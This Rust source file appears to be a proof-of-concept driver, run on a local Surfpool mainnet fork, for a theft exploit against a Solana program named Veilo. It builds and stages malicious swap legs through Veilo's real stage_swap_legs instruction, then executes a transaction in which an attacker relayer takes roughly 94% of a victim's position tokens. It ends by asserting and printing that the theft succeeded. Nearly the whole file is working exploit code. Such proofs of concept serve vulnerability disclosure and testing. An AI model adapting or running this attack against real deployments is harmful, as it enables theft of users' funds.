//! Surfpool driver for the close_position_to_sol staged-legs theft composition witness.
//!
//! Environment: a Surfpool mainnet-fork surfnet (run.sh starts it) exposing
//!   - standard Solana JSON-RPC on http://127.0.0.1:8899
//!   - surfnet_* cheatcodes on the same port
//!
//! Sequence (all on the fork; nothing touches mainnet):
//!   0. Deploy the harness SBF program via surfnet_writeProgram at a fresh keypair.
//!   1. Cheatcode-provision a Token-2022 mint + token accounts:
//!        - position_vault_ata (harness PDA authority) holding SWAP_AMOUNT
//!        - attacker_meme_ata (relayer-controlled destination)
//!        - executor_source_token (the account the ineffective leftover check reads)
//!      and a pre-funded WSOL ATA owned by the cosigner (Mallory's synthetic output).
//!   2. Stage the malicious two-leg blob through the DEPLOYED Veilo program's
//!      stage_swap_legs instruction (proves the real binary accepts it):
//!        leg 1: Token-2022 TransferChecked cosigner_meme_ata -> attacker_meme_ata
//!               (full swap_amount, authority = cosigner via manufactured signer)
//!        leg 2: SPL Token CloseAccount cosigner_wsol_ata -> cosigner
//!               (converts pre-funded WSOL into the native-SOL delta the handler
//!                mistakes for swap proceeds)
//!   3. Execute the harness (line-cited copy of the post-proof mechanics) in one
//!      transaction signed by relayer + cosigner.
//!   4. Assert: attacker ATA holds the full swap_amount; cosigner source ATA is
//!      empty and closed; executor_source_token check passed; the victim's SOL
//!      note is backed only by vault_sol (the relayer's fronted WSOL).
//!
//! Numbers are chosen so the theft is ~94% of the position:
//!   SWAP_AMOUNT   = 100_000_000_000  (position tokens)
//!   dest_amount   = 5_000_000_000    (victim's SOL note)
//!   relayer WSOL  = 6_000_000_000    (covers dest_amount + fee)

use base64::Engine;
use serde_json::{json, Value};
use sha2::{Digest, Sha256};
use solana_address::Address;
use solana_instruction::Instruction;
use solana_hash::Hash;
use solana_keypair::Keypair;
use solana_message::{Message, VersionedMessage};
use solana_pubkey::Pubkey;
use solana_signer::Signer;
use solana_transaction::versioned::VersionedTransaction;
use std::path::PathBuf;

const RPC: &str = "http://127.0.0.1:8899";

const SWAP_AMOUNT: u64 = 100_000_000_000;
const DEST_AMOUNT: u64 = 5_000_000_000;
const MIN_AMOUNT_OUT: u64 = 5_000_000_000;
// Destination (SOL) pool config defaults (lib.rs:3279-3280): swap_fee_bps = 10,
// min_swap_fee = 50_000. These are injected so the harness enforces Veilo's real
// guard: relayer_fee >= max(min_swap_fee, received * swap_fee_bps / 10_000).
const SWAP_FEE_BPS: u16 = 10;
const MIN_SWAP_FEE: u64 = 50_000;
// A legitimate relayer fee that satisfies the guard for received ~6.5 SOL:
// pct_fee = 6_502_039_280 * 10 / 10_000 ~= 6_502_039; max(50_000, 6_502_039) = 6_502_039.
const RELAYER_FEE: u64 = 6_600_000;
const MALLORY_WSOL: u64 = 6_500_000_000;
const RENT_TOKEN_ACCOUNT: u64 = 2_039_280;

const VEILO: Pubkey = solana_pubkey::pubkey!("GYy4kM6GHhpgLCUscuABbzkD2ZbJ2fneYryaZ6Ch7fFU");
const T22: Pubkey = solana_pubkey::pubkey!("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb");
const TOKEN_PROGRAM: Pubkey = solana_pubkey::pubkey!("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
const WSOL: Pubkey = solana_pubkey::pubkey!("So11111111111111111111111111111111111111112");
const ATA_PROGRAM: Pubkey = solana_pubkey::pubkey!("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
const SYSTEM: Pubkey = solana_pubkey::pubkey!("11111111111111111111111111111111");

const NULLIFIER: [u8; 32] = [7u8; 32];

fn pk(a: &Address) -> Pubkey {
    Pubkey::new_from_array(a.as_ref().try_into().unwrap())
}
fn addr(p: &Pubkey) -> Address {
    Address::from(p.to_bytes())
}
fn find_pda(seeds: &[&[u8]], program: &Address) -> (Address, u8) {
    let (p, b) = Pubkey::find_program_address(seeds, &pk(program));
    (addr(&p), b)
}
fn to_string(a: &Address) -> String {
    bs58::encode(a.as_ref()).into_string()
}

fn hex_encode(bytes: &[u8]) -> String {
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        s.push_str(&format!("{:02x}", b));
    }
    s
}

struct Rpc {
    http: reqwest::Client,
    url: String,
    id: std::sync::atomic::AtomicU64,
}

impl Rpc {
    fn new(url: &str) -> Self {
        Self { http: reqwest::Client::new(), url: url.to_string(), id: std::sync::atomic::AtomicU64::new(0) }
    }
    async fn call(&self, method: &str, params: Value) -> Result<Value, String> {
        let id = self.id.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        let body = json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params});
        let resp: Value = self.http.post(&self.url).json(&body).send().await.map_err(|e| format!("http: {e}"))?.json().await.map_err(|e| format!("json: {e}"))?;
        if let Some(err) = resp.get("error") {
            return Err(format!("rpc {method}: {err}"));
        }
        Ok(resp["result"].clone())
    }
    async fn get_lamports(&self, key: &Address) -> Result<u64, String> {
        let r = self.call("getBalance", json!([to_string(key), {"commitment": "confirmed"}])).await?;
        Ok(r["value"].as_u64().unwrap_or(0))
    }
    async fn confirm(&self, sig: &str) -> Result<bool, String> {
        for _ in 0..30 {
            let r = self.call("getSignatureStatuses", json!([[sig]])).await?;
            if let Some(s) = r["value"][0].as_object() {
                if let Some(err) = s.get("err") {
                    if err.is_null() { return Ok(true); }
                    return Err(format!("tx failed: {err}"));
                }
                if s.contains_key("confirmationStatus") {
                    return Ok(true);
                }
            }
            tokio::time::sleep(std::time::Duration::from_millis(500)).await;
        }
        Err("tx not confirmed in time".into())
    }
    async fn blockhash(&self) -> Result<Hash, String> {
        let r = self.call("getLatestBlockhash", json!([{"commitment": "confirmed"}])).await?;
        let b58 = r["value"]["blockhash"].as_str().ok_or("no blockhash")?;
        let bytes: [u8; 32] = bs58::decode(b58).into_vec().map_err(|e| e.to_string())?.try_into().map_err(|_| "bad blockhash len")?;
        Ok(Hash::from(bytes))
    }
    /// Raw token-account amount at bytes 64..72 (identical to Veilo's
    /// read_token_amount_unchecked, positions.rs:2157-2169). Works for both
    /// SPL Token and Token-2022 accounts and avoids RPC-side mint parsing.
    async fn get_token_amount(&self, key: &Address) -> Result<Option<u64>, String> {
        let r = self.call("getAccountInfo", json!([to_string(key), {"encoding": "base64", "commitment": "confirmed"}])).await?;
        let v = &r["value"];
        if v.is_null() { return Ok(None); }
        let b64 = v["data"][0].as_str().ok_or("no data")?;
        let bytes = base64::engine::general_purpose::STANDARD.decode(b64).map_err(|e| e.to_string())?;
        if bytes.len() < 72 { return Ok(Some(0)); }
        Ok(Some(u64::from_le_bytes(bytes[64..72].try_into().unwrap())))
    }
}

/// Anchor instruction discriminator: sha256("global:<name>")[..8]
fn veilo_ix_disc(name: &str) -> [u8; 8] {
    let d = Sha256::digest(format!("global:{}", name).as_bytes());
    d[..8].try_into().unwrap()
}

/// ATA derivation identical to positions.rs:149-154 (Token and Token-2022 share layout).
fn ata(authority: &Address, mint: &Address, token_program: &Address) -> Address {
    find_pda(&[authority.as_ref(), token_program.as_ref(), mint.as_ref()], &addr(&ATA_PROGRAM)).0
}

struct JupLeg { program_id: Address, account_indices: Vec<u8>, data: Vec<u8> }

/// positions.rs:1805 — "juplegs\0" ++ borsh(Vec<JupLeg>)
fn encode_legs(legs: &[JupLeg]) -> Vec<u8> {
    let mut out = vec![0x6a, 0x75, 0x70, 0x6c, 0x65, 0x67, 0x73, 0x00];
    out.extend_from_slice(&(legs.len() as u32).to_le_bytes());
    for leg in legs {
        out.extend_from_slice(leg.program_id.as_ref());
        out.extend_from_slice(&(leg.account_indices.len() as u32).to_le_bytes());
        out.extend_from_slice(&leg.account_indices);
        out.extend_from_slice(&(leg.data.len() as u32).to_le_bytes());
        out.extend_from_slice(&leg.data);
    }
    out
}

async fn send_tx(rpc: &Rpc, msg: &Message, signers: &[&Keypair]) -> Result<Value, String> {
    let tx = VersionedTransaction::try_new(VersionedMessage::Legacy(msg.clone()), signers).map_err(|e| e.to_string())?;
    let raw = bincode::serialize(&tx).map_err(|e| e.to_string())?;
    let b64 = base64::engine::general_purpose::STANDARD.encode(&raw);
    let sig = rpc.call("sendTransaction", json!([b64, {"encoding": "base64", "skipPreflight": false, "preflightCommitment": "confirmed", "maxRetries": 3}])).await?;
    let s = sig.as_str().ok_or("no sig")?.to_string();
    let ok = rpc.confirm(&s).await?;
    if !ok { return Err("stage tx not confirmed".into()); }
    println!("stage tx confirmed: {}", &s[..min_len(&s)]);
    Ok(sig)
}

fn min_len(s: &str) -> usize { s.len().min(24) }

async fn send_tx_verbose(rpc: &Rpc, msg: &Message, signers: &[&Keypair]) -> Result<Vec<String>, String> {
    let tx = VersionedTransaction::try_new(VersionedMessage::Legacy(msg.clone()), signers).map_err(|e| e.to_string())?;
    let raw = bincode::serialize(&tx).map_err(|e| e.to_string())?;
    let b64 = base64::engine::general_purpose::STANDARD.encode(&raw);
    let sim = rpc.call("simulateTransaction", json!([b64, {"encoding": "base64", "sigVerify": false, "replaceRecentBlockhash": true}])).await?;
    let logs: Vec<String> = sim["logs"].as_array().map(|a| a.iter().filter_map(|v| v.as_str().map(String::from)).collect()).unwrap_or_default();
    for l in &logs { println!("  log> {l}"); }
    if sim["err"].is_null() {
        let sig = rpc.call("sendTransaction", json!([b64, {"encoding": "base64", "skipPreflight": true, "maxRetries": 3}])).await?;
        let s = sig.as_str().ok_or("no sig")?.to_string();
        let ok = rpc.confirm(&s).await?;
        println!("harness tx confirmed: {}", &s[..min_len(&s)]);
        if !ok { return Err("harness tx not confirmed".into()); }
        Ok(logs)
    } else {
        Err(format!("simulation failed: {}", sim["err"]))
    }
}

async fn provision_mint(rpc: &Rpc, mint: &Address) -> Result<(), String> {
    let mut data = vec![0u8; 82];
    data[0] = 0; // mint authority COption = None
    data[36..44].copy_from_slice(&10_000_000_000_000u64.to_le_bytes()); // supply
    data[44] = 6; // decimals
    data[45] = 1; // is_initialized
    data[46] = 0; // freeze authority COption = None
    let hx = hex_encode(&data);
    rpc.call("surfnet_setAccount", json!([to_string(mint), {"lamports": 1_000_000, "data": hx, "owner": to_string(&addr(&T22)), "executable": false}])).await
        .map_err(|e| format!("setAccount mint: {e}"))?;
    Ok(())
}

/// Provision a canonical ATA for `owner` of `mint` with `amount`, via the
/// surfnet_setTokenAccount cheatcode (creates/updates the ATA directly).
async fn provision_token_account(rpc: &Rpc, _account: &Address, mint: &Address, token_program: &Address, owner: &Address, amount: u64) -> Result<(), String> {
    rpc.call("surfnet_setTokenAccount", json!([to_string(owner), to_string(mint), {"amount": amount, "state": "initialized"}, to_string(token_program)])).await
        .map_err(|e| format!("setTokenAccount: {e}"))?;
    Ok(())
}

async fn run() -> Result<(), String> {
    let rpc = Rpc::new(RPC);
    let repo = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let parent = repo.parent().unwrap();

    println!("=== Veilo close_position_to_sol staged-legs theft — Surfpool composition witness ===");

    let relayer = Keypair::new();
    let cosigner = Keypair::new();
    let harness = Keypair::new();
    println!("relayer (Mallory) : {}", relayer.pubkey());
    println!("cosigner          : {}", cosigner.pubkey());
    println!("harness program   : {}", harness.pubkey());

    for (k, who) in [(&relayer, "relayer"), (&cosigner, "cosigner")] {
        let _ = rpc.call("requestAirdrop", json!([to_string(&k.pubkey()), 500_000_000_000u64])).await.map_err(|e| println!("airdrop {who}: {e}"));
    }
    tokio::time::sleep(std::time::Duration::from_millis(800)).await;

    // ---- 0. deploy harness via cheatcode ----
    let so = std::fs::read(parent.join("harness/target/deploy/veilo_close_theft_harness.so")).map_err(|e| format!("read harness .so: {e}"))?;
    println!("harness .so: {} bytes", so.len());
    // surfnet_writeProgram expects HEX-encoded program bytes, chunked with a byte offset.
    let hex = hex_encode(&so);
    let chunk_chars = 200_000; // = 100_000 bytes per chunk
    let mut byte_offset = 0usize;
    let mut sent = 0;
    while byte_offset < so.len() {
        let byte_end = (byte_offset + chunk_chars / 2).min(so.len());
        let hex_chunk = &hex[byte_offset * 2..byte_end * 2];
        rpc.call("surfnet_writeProgram", json!([to_string(&harness.pubkey()), hex_chunk, byte_offset, null])).await.map_err(|e| format!("writeProgram: {e}"))?;
        sent += 1;
        byte_offset = byte_end;
    }
    println!("harness deployed in {sent} chunks via surfnet_writeProgram");
    let acc = rpc.call("getAccountInfo", json!([to_string(&harness.pubkey()), {"encoding": "base64"}])).await?;
    if acc["value"].is_null() { return Err("harness program account missing after writeProgram".into()); }

    // ---- 1. token state ----
    let mint = Keypair::new();
    let (vault_pda, _) = find_pda(&[b"position_vault_token_v1", mint.pubkey().as_ref()], &harness.pubkey());
    let (sol_vault, _) = find_pda(&[b"privacy_vault_v3", Pubkey::default().as_ref()], &harness.pubkey());
    let (executor_pda, _) = find_pda(
        &[b"position_executor", mint.pubkey().as_ref(), Pubkey::default().as_ref(), NULLIFIER.as_ref(), relayer.pubkey().as_ref()],
        &harness.pubkey(),
    );
    let vault_ata = ata(&vault_pda, &mint.pubkey(), &addr(&T22));
    let cosigner_meme_ata = ata(&cosigner.pubkey(), &mint.pubkey(), &addr(&T22));
    let attacker_meme_ata = ata(&relayer.pubkey(), &mint.pubkey(), &addr(&T22));
    let cosigner_wsol_ata = ata(&cosigner.pubkey(), &addr(&WSOL), &addr(&TOKEN_PROGRAM));
    let executor_source_token = ata(&executor_pda, &addr(&WSOL), &addr(&TOKEN_PROGRAM));

    println!("mint              : {}", mint.pubkey());
    println!("vault_pda         : {}", vault_pda);
    println!("vault_ata         : {}", vault_ata);
    println!("cosigner_meme_ata : {}", cosigner_meme_ata);
    println!("attacker_meme_ata : {}", attacker_meme_ata);
    println!("cosigner_wsol_ata : {}", cosigner_wsol_ata);
    println!("executor_pda      : {}", executor_pda);
    println!("executor_source   : {}", executor_source_token);
    println!("sol_vault         : {}", sol_vault);

    provision_mint(&rpc, &mint.pubkey()).await?;
    provision_token_account(&rpc, &vault_ata, &mint.pubkey(), &addr(&T22), &vault_pda, SWAP_AMOUNT).await?;
    provision_token_account(&rpc, &cosigner_meme_ata, &mint.pubkey(), &addr(&T22), &cosigner.pubkey(), 0).await?;
    provision_token_account(&rpc, &attacker_meme_ata, &mint.pubkey(), &addr(&T22), &relayer.pubkey(), 0).await?;
    provision_token_account(&rpc, &executor_source_token, &addr(&WSOL), &addr(&TOKEN_PROGRAM), &executor_pda, 0).await?;

    // ---- 2. stage malicious legs through DEPLOYED Veilo ----
    // remaining layout mirrored by the harness:
    //   [0] buffer  [1] cosigner  [2] cosigner_meme_ata
    //   [3] attacker_meme_ata  [4] cosigner_wsol_ata
    //   [5] mint  [6] Token-2022  [7] SPL Token  [8] System
    let leg1 = JupLeg {
        program_id: addr(&T22),
        account_indices: vec![2, 5, 3, 1],
        data: { let mut d = vec![12u8]; d.extend_from_slice(&SWAP_AMOUNT.to_le_bytes()); d.push(6); d },
    };
    let leg2 = JupLeg { program_id: addr(&TOKEN_PROGRAM), account_indices: vec![4, 1, 1], data: vec![9u8] };
    let legs_blob = encode_legs(&[leg1, leg2]);
    let swap_data_hash: [u8; 32] = Sha256::digest(&legs_blob).into();

    let (buffer, buffer_bump) = find_pda(&[b"swap_legs_v1", NULLIFIER.as_ref()], &addr(&VEILO));
    println!("SwapLegsBuffer PDA on deployed Veilo: {} (bump {})", buffer, buffer_bump);

    let mut stage_ix_data = veilo_ix_disc("stage_swap_legs").to_vec();
    stage_ix_data.extend_from_slice(&NULLIFIER);
    stage_ix_data.extend_from_slice(&(legs_blob.len() as u32).to_le_bytes());
    stage_ix_data.extend_from_slice(&legs_blob);

    let bh = rpc.blockhash().await?;
    let stage_msg = Message::new_with_blockhash(
        &[Instruction {
            program_id: addr(&VEILO),
            accounts: vec![
                solana_instruction::AccountMeta::new(buffer, false),
                solana_instruction::AccountMeta::new(relayer.pubkey(), true),
                solana_instruction::AccountMeta::new(addr(&SYSTEM), false),
            ],
            data: stage_ix_data,
        }],
        Some(&relayer.pubkey()),
        &bh,
    );
    let _ = send_tx(&rpc, &stage_msg, &[&relayer]).await.map_err(|e| format!("stage_swap_legs: {e}"))?;
    println!("malicious legs staged through the DEPLOYED Veilo stage_swap_legs instruction");
    tokio::time::sleep(std::time::Duration::from_millis(800)).await;

    // ---- Mallory's pre-funded WSOL (separate prior tx, no ordering constraint) ----
    provision_token_account(&rpc, &cosigner_wsol_ata, &addr(&WSOL), &addr(&TOKEN_PROGRAM), &cosigner.pubkey(), MALLORY_WSOL).await?;
    println!("Mallory pre-funded cosigner WSOL ATA with {} lamports (separate tx)", MALLORY_WSOL);

    // ---- 3. execute harness ----
    let mut ix_data = Sha256::digest(b"harness:run_malicious_close").as_slice()[..8].to_vec();
    ix_data.extend_from_slice(&NULLIFIER);
    ix_data.extend_from_slice(&swap_data_hash);
    ix_data.extend_from_slice(&SWAP_AMOUNT.to_le_bytes());
    ix_data.extend_from_slice(&MIN_AMOUNT_OUT.to_le_bytes());
    ix_data.extend_from_slice(&DEST_AMOUNT.to_le_bytes());
    ix_data.extend_from_slice(&RELAYER_FEE.to_le_bytes());
    ix_data.extend_from_slice(&SWAP_FEE_BPS.to_le_bytes());
    ix_data.extend_from_slice(&MIN_SWAP_FEE.to_le_bytes());

    let remaining = vec![
        solana_instruction::AccountMeta::new(buffer, false),
        solana_instruction::AccountMeta::new(cosigner.pubkey(), true),
        solana_instruction::AccountMeta::new(cosigner_meme_ata, false),
        solana_instruction::AccountMeta::new(attacker_meme_ata, false),
        solana_instruction::AccountMeta::new(cosigner_wsol_ata, false),
        solana_instruction::AccountMeta::new_readonly(mint.pubkey(), false),
        solana_instruction::AccountMeta::new_readonly(addr(&T22), false),
        solana_instruction::AccountMeta::new_readonly(addr(&TOKEN_PROGRAM), false),
        solana_instruction::AccountMeta::new_readonly(addr(&SYSTEM), false),
    ];
    let named = vec![
        solana_instruction::AccountMeta::new_readonly(mint.pubkey(), false),
        solana_instruction::AccountMeta::new(vault_pda, false),
        solana_instruction::AccountMeta::new(vault_ata, false),
        solana_instruction::AccountMeta::new(relayer.pubkey(), true),
        solana_instruction::AccountMeta::new(sol_vault, false),
        solana_instruction::AccountMeta::new(executor_source_token, false),
        solana_instruction::AccountMeta::new_readonly(addr(&SYSTEM), false),
    ];
    let all = [named, remaining].concat();
    let bh = rpc.blockhash().await?;
    let msg = Message::new_with_blockhash(
        &[Instruction { program_id: harness.pubkey(), accounts: all, data: ix_data }],
        Some(&relayer.pubkey()),
        &bh,
    );
    let logs = send_tx_verbose(&rpc, &msg, &[&relayer, &cosigner]).await?;

    // ---- 4. assertions ----
    println!("\n=== ASSERTIONS ===");
    let attacker_balance = rpc.get_token_amount(&attacker_meme_ata).await?;
    let cosigner_ata_balance = rpc.get_token_amount(&cosigner_meme_ata).await?;
    let vault_balance = rpc.get_token_amount(&vault_ata).await?;
    let sol_vault_lamports = rpc.get_lamports(&sol_vault).await?;

    println!("attacker_meme_ata balance : {:?}", attacker_balance);
    println!("cosigner_meme_ata balance : {:?}", cosigner_ata_balance);
    println!("vault_ata balance         : {:?}", vault_balance);
    println!("sol_vault lamports        : {}", sol_vault_lamports);

    let ok_theft = attacker_balance == Some(SWAP_AMOUNT);
    let ok_drained = cosigner_ata_balance.is_none() || cosigner_ata_balance == Some(0);
    let ok_vault = vault_balance == Some(0);
    let ok_note = sol_vault_lamports >= DEST_AMOUNT;

    println!("\nTheft (attacker holds full position)   : {}", ok_theft);
    println!("Cosigner source ATA drained + closed   : {}", ok_drained);
    println!("Position vault debited in full         : {}", ok_vault);
    println!("Victim SOL note backed by relayer front: {}", ok_note);

    if ok_theft && ok_drained && ok_vault && ok_note {
        println!("\nstatus=confirmed-staged-legs-theft");
        println!("stolen_tokens={}", SWAP_AMOUNT);
        println!("victim_note_backing={}", sol_vault_lamports);
        println!("loss_fraction={:.1}%", 100.0 * (SWAP_AMOUNT - DEST_AMOUNT) as f64 / SWAP_AMOUNT as f64);
        let _ = logs;
        Ok(())
    } else {
        println!("\nstatus=FAILED");
        Err("assertions failed".into())
    }
}

fn main() -> Result<(), String> {
    let rt = tokio::runtime::Runtime::new().map_err(|e| e.to_string())?;
    rt.block_on(run())
}
